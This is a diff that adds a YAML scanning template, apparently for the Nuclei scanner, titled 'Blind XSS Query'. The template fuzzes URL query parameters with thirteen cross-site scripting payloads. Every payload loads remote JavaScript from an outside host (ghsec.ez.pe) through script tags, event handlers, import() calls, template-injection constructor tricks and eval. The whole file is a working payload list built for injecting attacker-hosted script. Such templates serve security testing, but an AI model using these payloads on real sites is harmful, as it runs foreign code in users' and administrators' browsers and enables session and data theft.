@@ -1,0 +1,38 @@
+id: bxss-query
+
+info:
+  name: Blind XSS Query
+  author: ghsec
+  severity: High
+  description: Blind XSS Query
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - '!contains(path, ".js")'  # exclude .js files
+        condition: and
+          
+    payloads:
+      bxss:
+        - "<script src=//ghsec.ez.pe></script>"
+        - '"><script src=//ghsec.ez.pe></script>'
+        - '"><script src=//ghsec.ez.pe></script><x="'
+        - '$.getScript("//ghsec.ez.pe")'
+        - "\"><img src onerror=import('//ghsec.ez.pe')>"
+        - "\"><img/src/onerror=import('//ghsec.ez.pe')>"
+        - "\"><svg><script href=//ghsec.ez.pe />"
+        - "\"><svg/onload=import('//ghsec.ez.pe')>"
+        - "javascript:import('//ghsec.ez.pe')"
+        - "{{_openBlock.constructor('import(\"//ghsec.ez.pe\")')()}}"
+        - "{{constructor.constructor('import(\"//ghsec.ez.pe\")')()}}"
+        - "javascript:eval('var a=document.createElement(\'script\');a.src=\'//ghsec.ez.pe\';document.body.appendChild(a)')"
+        - "document.head.appendChild(Object.assign(document.createElement('script'),{src:'//ghsec.ez.pe'}));"
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{bxss}}"
